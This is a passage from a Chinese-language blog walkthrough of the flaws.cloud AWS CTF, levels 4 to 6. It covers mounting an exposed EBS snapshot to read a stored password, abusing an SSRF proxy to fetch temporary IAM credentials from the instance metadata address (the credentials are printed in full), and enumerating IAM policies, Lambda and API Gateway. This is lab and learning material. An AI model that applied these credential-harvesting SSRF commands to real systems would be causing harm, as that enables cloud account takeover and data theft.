+<p>这里创建时会自动新创建一个卷，如果想绑定其他卷需要先断开卷和实例的链接，然后再绑定CTF这个卷</p>
+<p>将卷和实例绑定（要注意需要在一个可用区里，这里都是在us-west-2c）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 attach-volume --volume-id vol-0642240204d119957 --instance-id i-0605c67ef512556a2 --device &#x2F;dev&#x2F;sdf</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827131915834.png" alt="image-20200827131915834"></p>
+<p>使用Xshell连接AWS，用户名需要使用ubuntu，否则会报错</p>
+<p><img src="AWS_CTF.assets/image-20200827132038887.png" alt="image-20200827132038887"></p>
+<p>也可以直接使用命令（这里是使用的xshell登录的）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i &quot;ctf-key.pem&quot; ubuntu@ec2-54-201-167-24.us-west-2.compute.amazonaws.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827134949657.png" alt="image-20200827134949657"></p>
+<h3 id="连接实例之后查找密码"><a href="#连接实例之后查找密码" class="headerlink" title="连接实例之后查找密码"></a>连接实例之后查找密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsblk</span><br><span class="line">lsblk命令用于列出所有可用块设备的信息，而且还能显示他们之间的依赖关系</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827135743834.png" alt="image-20200827135743834"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /mnt/flaws</span><br><span class="line">sudo mount /dev/xvdf1 /mnt/flaws</span><br><span class="line">mount</span><br><span class="line">Linux mount命令用于挂载Linux系统外的文件。</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827135825685.png" alt="image-20200827135825685"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;mnt&#x2F;flaws</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827135904540.png" alt="image-20200827135904540"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">根据提示中的ngnix查看：</span><br><span class="line">cd &#x2F;mnt&#x2F;flaws&#x2F;etc&#x2F;nginx&#x2F;</span><br><span class="line">ls -al</span><br><span class="line"></span><br><span class="line">cat .htpasswd</span><br><span class="line">ls &#x2F;mnt&#x2F;flaws&#x2F;home&#x2F;ubuntu&#x2F;</span><br><span class="line">cat &#x2F;mnt&#x2F;flaws&#x2F;home&#x2F;ubuntu&#x2F;setupNginx.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827135939150.png" alt="image-20200827135939150"></p>
+<p>使用账号<code>flaws</code> 密码 <code>nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</code>登录成功</p>
+<p><img src="AWS_CTF.assets/image-20200827143507615.png" alt="image-20200827143507615"></p>
+<h3 id="问题点和思路"><a href="#问题点和思路" class="headerlink" title="问题点和思路"></a>问题点和思路</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">快照未授权访问？能够直接根据快照创建实例?</span><br><span class="line"></span><br><span class="line">前提：</span><br><span class="line">当前控制的用户需要能够访问快照</span><br><span class="line"></span><br><span class="line">首先需要能够访问到快照，如果访问不到快照则不行-----&gt;根据快照绑定实例------&gt;登录实例，就可以访问了</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-5-SSRF"><a href="#level-5-SSRF" class="headerlink" title="level 5 SSRF"></a>level 5 SSRF</h2><p>这一关的目的是列出level 6的存储桶的内容，同时考察元数据的问题</p>
+<p><img src="AWS_CTF.assets/image-20200827151647768.png" alt="image-20200827151647768"></p>
+<p>这里可以看到，有一个代理功能可以使用</p>
+<p><a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/" target="_blank" rel="noopener">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/</a></p>
+<p>访问上面的地址回显为<code>flaws.cloud</code>的内容</p>
+<h3 id="实例元数据"><a href="#实例元数据" class="headerlink" title="实例元数据"></a>实例元数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实例元数据是有关您的实例的数据，可用于配置或管理正在运行的实例。实例元数据分为几类，例如，主机名，事件和安全组。</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827145810310.png" alt="image-20200827145810310"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">169.254.169.254</span><br><span class="line"></span><br><span class="line">IP地址169.254.169.254是云服务中的一个神奇IP，AWS、Azure、谷歌、DigitalOcean等公司都使用它来查找自身的元数据。对于谷歌，对请求有额外的约束，比如要求它使用Metadata-Flavor: Google作为HTTP头，拒绝带有x - forwarding - for头的请求，而在AWS中并没有约束。如果攻击者可以从EC2向该IP发出任何类型的HTTP请求，就很有可能获取到一些敏感信息。这里提供hackerone平台上两篇公开披露的报告用以参考学习：https:&#x2F;&#x2F;hackerone.com&#x2F;reports&#x2F;53088 、https:&#x2F;&#x2F;hackerone.com&#x2F;reports&#x2F;53004。</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;qastack.cn&#x2F;server&#x2F;427018&#x2F;what-is-this-ip-address-169-254-169-254</span><br><span class="line"></span><br><span class="line">AWS的资料</span><br><span class="line">https:&#x2F;&#x2F;docs.aws.amazon.com&#x2F;AWSEC2&#x2F;latest&#x2F;UserGuide&#x2F;instancedata-data-retrieval.html</span><br><span class="line">链接本地地址</span><br><span class="line">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Link-local_address</span><br><span class="line">https:&#x2F;&#x2F;tools.ietf.org&#x2F;html&#x2F;rfc3927</span><br></pre></td></tr></table></figure>
+
+<p>检查历史命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;mnt&#x2F;flaws&#x2F;home&#x2F;ubuntu&#x2F;</span><br><span class="line">cat .bash_history</span><br></pre></td></tr></table></figure>
+
+<p>看到记录：</p>
+<p><img src="AWS_CTF.assets/image-20200827151510694.png" alt="image-20200827151510694"></p>
+<p>直接访问这个地址是访问不了的：</p>
+<p><img src="AWS_CTF.assets/image-20200827152023772.png" alt="image-20200827152023772"></p>
+<p>尝试通过EC2的代理访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  http:&#x2F;&#x2F;4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud&#x2F;proxy&#x2F;169.254.169.254&#x2F;latest&#x2F;meta-data&#x2F;iam&#x2F;info</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827152135058.png" alt="image-20200827152135058"></p>
+<p>可以看到返回了一个json的内容，没有秘钥，可以看到上面的历史记录里有一个：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;169.254.169.254&#x2F;iam&#x2F;security-credentials&#x2F;flaws</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取AK、SK"><a href="#获取AK、SK" class="headerlink" title="获取AK、SK"></a>获取AK、SK</h3><p>尝试通过代理访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud&#x2F;proxy&#x2F;169.254.169.254&#x2F;latest&#x2F;meta-data&#x2F;iam&#x2F;security-credentials&#x2F;flaws&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827152512340.png" alt="image-20200827152512340"></p>
+<p>这里就获取了一个AK和SAK</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"Code"</span> : <span class="string">"Success"</span>,</span><br><span class="line">  <span class="attr">"LastUpdated"</span> : <span class="string">"2020-08-27T06:48:25Z"</span>,</span><br><span class="line">  <span class="attr">"Type"</span> : <span class="string">"AWS-HMAC"</span>,</span><br><span class="line">  <span class="attr">"AccessKeyId"</span> : <span class="string">"ASIA6GG7PSQGZGH5CZXW"</span>,</span><br><span class="line">  <span class="attr">"SecretAccessKey"</span> : <span class="string">"GqfddXDTtitUDLGl+VHhx8iXU9qp2knKGfuE5Wz+"</span>,</span><br><span class="line">  <span class="attr">"Token"</span> : <span class="string">"IQoJb3JpZ2luX2VjEP///////////wEaCXVzLXdlc3QtMiJIMEYCIQDlEoLtG5+78AH1h4/9+MnaexeO2++/pt8B5zAXdiY9vAIhAK/qRMGz39RBflcbHOJB1NCzk/St90c+DKzMIr9/mvvDKr0DCOj//////////wEQARoMOTc1NDI2MjYyMDI5IgzB8n7UIgIVWxenF2IqkQMVjfljmETO7swVegtyk0i1lxvtUDQUsgNTAIWzUqTHOUniGsyy99TUjG4nXbU2k4QqWZ3KInMtsqEJQO5jigctt4hUsiev2E9BWlnT7pkoDS2pF05Xv54SNUPP2xmYykE97dkK6EJE3gmiwYGhNaUti5r8yfuFBoRPugeKmJMs74/evBeLwtGvURXzdbFSbherkHecPMEDt9+WeVkBkQPJHCyqgwdCAgogWkXMaZm7o3P/JKKTslauF0tIJbL+l9FlwcmKuXix3RIYOLP5Es9HD683mlOQs21CMEh5qGRsvbg/44BvBs4eNgkgnxdi5obFEul6w2K3RBz7cqNSkHDkAgbCNUB06JavhG3CtO2YG02Rfmas6cARoi8LvN8GKG7i1/0f5U4seEccKobCXhpMoO9Vd/x+YGOOWP75Un/sAJEYbmICA9D2NTrteyDGkmgytXUDwbK0J84svSHdSIFbxcwYGpPW9p8TGQsoXwTNXkkAnYsVdTy2AfYDaPC6XBc+1N7HW3wfG+ViK5CR70X8MTDcrp36BTrqAYnHYC1dhQm+GaIV4NOtAy5uIjGVoIXco4bKoUGMWf+6CpjEwo6jzP+HBoiQfWOAhTz2ac7KgZEluVHs/0eW2HHdCJsedRRjEsJFTSw/ZPG72dAYjYdyz6REF2pCQP9NMMwpfPwyyOZ6XrUdbWhq+nUGpvjHiZfNHuP7pGAyfycQhM6T2psS7/SpBScCpVEGKM3URPAjBZ9Uh4XG0/ihb0e2EpxdPP+gpZR+ZRdYG5XHt4a0Rnoon7JnQYVP95GjRBRtoY/eoSK98y1sTgmKWNYIH4KxueZboOBEzZJr96Xa7edRAlkBTBNFsQ=="</span>,</span><br><span class="line">  <span class="attr">"Expiration"</span> : <span class="string">"2020-08-27T12:54:03Z"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将AK和SAK和Token写入配置文件（这里的windows的客户端）：</p>
+<p><img src="AWS_CTF.assets/image-20200827153219163.png" alt="image-20200827153219163"></p>
+<p>然后获取level6的存储桶的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --profile proxy s3 ls s3:&#x2F;&#x2F;level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827153606248.png" alt="image-20200827153606248"></p>
+<p>获取隐藏路径<code>ddcc78ff</code>，访问<code>http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/</code>进入level6</p>
+<p><img src="AWS_CTF.assets/image-20200827153755299.png" alt="image-20200827153755299"></p>
+<h3 id="问题点和思路-1"><a href="#问题点和思路-1" class="headerlink" title="问题点和思路"></a>问题点和思路</h3><p>这里将环境配置为一个proxy参数接收一个URL，模拟SSRF的漏洞，然后通过SSRF查看实例元数据的内容，从而获得了AK和SK</p>
+<p>可以参考：<a href="https://blog.appsecco.com/server-side-request-forgery-ssrf-and-aws-ec2-instances-after-instance-meta-data-service-version-38fc1ba1a28a" target="_blank" rel="noopener">https://blog.appsecco.com/server-side-request-forgery-ssrf-and-aws-ec2-instances-after-instance-meta-data-service-version-38fc1ba1a28a</a></p>
+<p>修复方式：<a href="https://duo.com/decipher/aws-adds-new-protections-against-ssrf-other-web-app-attacks" target="_blank" rel="noopener">https://duo.com/decipher/aws-adds-new-protections-against-ssrf-other-web-app-attacks</a></p>
+<h2 id="level-6-安全策略和Lambad"><a href="#level-6-安全策略和Lambad" class="headerlink" title="level 6 安全策略和Lambad"></a>level 6 安全策略和Lambad</h2><h3 id="AK和SAK的泄露"><a href="#AK和SAK的泄露" class="headerlink" title="AK和SAK的泄露"></a>AK和SAK的泄露</h3><p>首先给了一个AK和SAK</p>
+<p><img src="AWS_CTF.assets/image-20200827164757163.png" alt="image-20200827164757163"></p>
+<p>将凭据配置到<code>\.aws\credentials</code>文件中：</p>
+<p><img src="AWS_CTF.assets/image-20200827165743296.png" alt="image-20200827165743296"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws -<span class="literal">-profile</span> level6 iam <span class="built_in">get-user</span></span><br><span class="line"><span class="comment"># 查看当前用户</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827165000684.png" alt="image-20200827165000684"></p>
+<h3 id="查看策略"><a href="#查看策略" class="headerlink" title="查看策略"></a>查看策略</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws -<span class="literal">-profile</span> level6 iam list<span class="literal">-attached</span><span class="literal">-user</span><span class="literal">-policies</span> -<span class="literal">-user</span><span class="literal">-name</span> Level6</span><br><span class="line"><span class="comment"># list-attached-user-policies :列出附加到指定IAM用户的所有策略</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827165032638.png" alt="image-20200827165032638"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws -<span class="literal">-profile</span> level6 iam <span class="built_in">get-policy</span> -<span class="literal">-policy</span><span class="literal">-arn</span> arn:aws:iam::<span class="number">975426262029</span>:policy/list_apigateways</span><br><span class="line"><span class="comment"># 查看ARN为arn:aws:iam::975426262029:policy/list_apigateways的策略简略信息</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827165053567.png" alt="image-20200827165053567"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws -<span class="literal">-profile</span> level6 iam <span class="built_in">get-policy</span><span class="literal">-version</span>  -<span class="literal">-policy</span><span class="literal">-arn</span> arn:aws:iam::<span class="number">975426262029</span>:policy/list_apigateways -<span class="literal">-version</span><span class="literal">-id</span> v4</span><br><span class="line"><span class="comment"># 检索有关指定托管策略的指定版本的信息，包括策略文档</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827165120334.png" alt="image-20200827165120334"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws -<span class="literal">-region</span> us<span class="literal">-west</span><span class="literal">-2</span> -<span class="literal">-profile</span> level6 lambda list<span class="literal">-functions</span></span><br><span class="line"><span class="comment"># 安全客上的说是因为apigateway比较多的会和lambda放在一起使用，所以这里用语句查看一下当前账户的lambda函数</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827165133929.png" alt="image-20200827165133929"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws -<span class="literal">-region</span> us<span class="literal">-west</span><span class="literal">-2</span> -<span class="literal">-profile</span> level6 lambda <span class="built_in">get-policy</span> -<span class="literal">-function</span><span class="literal">-name</span> Level6</span><br><span class="line"><span class="comment"># 查看函数名为Level6的策略</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827165222188.png" alt="image-20200827165222188"></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"Policy"</span>: <span class="string">"</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">    	\"Version\":\"2012-10-17\",</span></span><br><span class="line"><span class="string">		\"Id\":\"default\",</span></span><br><span class="line"><span class="string">		\"Statement\":[</span></span><br><span class="line"><span class="string">		&#123;</span></span><br><span class="line"><span class="string">    		\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",</span></span><br><span class="line"><span class="string">    		\"Effect\":\"Allow\",</span></span><br><span class="line"><span class="string">			\"Principal\":&#123;\"Service\":\"apigateway.amazonaws.com\"&#125;,</span></span><br><span class="line"><span class="string">			\"Action\":\"lambda:InvokeFunction\",</span></span><br><span class="line"><span class="string">			\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",</span></span><br><span class="line"><span class="string">			\"Condition\":</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				\"ArnLike\":</span></span><br><span class="line"><span class="string">				&#123;\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"&#125;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		&#125;]</span></span><br><span class="line"><span class="string">	&#125;"</span>,</span><br><span class="line">    <span class="attr">"RevisionId"</span>: <span class="string">"98033dfd-defa-41a8-b820-1f20add9c77b"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从上面的JSON看到这个函数的SourceArn为<code>arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\</code>，其中<code>s33ppypa75</code>表示<code>rest-api-id</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws -<span class="literal">-profile</span> level6 -<span class="literal">-region</span> us<span class="literal">-west</span><span class="literal">-2</span> apigateway <span class="built_in">get-stages</span> -<span class="literal">-rest</span><span class="literal">-api</span><span class="literal">-id</span> <span class="string">"s33ppypa75"</span></span><br><span class="line"><span class="comment"># 获取有关一个或多个resources的信息?</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827165551492.png" alt="image-20200827165551492"></p>
+<p>AWS的资源端点规则：<code>https://&lt;rest-api-id&gt;.execute-api.&lt;region&gt;.amazonaws.com/&lt;stage-name&gt;/&lt;lambda function&gt;</code>，根据上面的信息拼接的URL为：<code>https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6</code>,这里最后的函数名要写成小写，写成大写访问不到</p>
+<p><img src="AWS_CTF.assets/image-20200827172419144.png" alt="image-20200827172419144"></p>
+<p>访问得到最终的链接</p>
+<p><img src="AWS_CTF.assets/image-20200827172502685.png" alt="image-20200827172502685"></p>
+<h3 id="问题点和思路-2"><a href="#问题点和思路-2" class="headerlink" title="问题点和思路"></a>问题点和思路</h3><p>这一题主要是考察lambda和API的使用</p>
+<p>思路：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先根据当前凭据获取用户名、USERID等信息--------&gt;查看当前用户IAM中的所有策略-------------&gt;根据apigateway联想到lambda(apigateway常用来调用管理lambda)-----------&gt;根据lambda策略获取rest-api-id名称和stage-name--------&gt;组成lambda的调用链接，访问之后得到通关的链接</span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/12-18-CSharp_%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%89%93%E5%8D%B0%E6%9C%BAIP%E5%9C%B0%E5%9D%80/">CSharp_获取域内打印机IP地址</a>
+            
+            
+            <a class="next" rel="next" href="/2020/12-18-ATT&CK_Privilege%20Escalation/">ATT&CK_Privilege Escalation</a>
+            
+        </section>
+	
+		<section id="comments" class="comments">
+		  <style>
+			.comments{margin:30px;padding:10px;background:#fff}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+		  </style>
+		  <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'ehQ0k7G3fcpwmkyxhG8U6DzL-gzGzoHsz',
+      app_key: 'AwwXGgbdqswiimAY0qJYhtRa',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+		</section>
+	
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© SeikoSrp | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
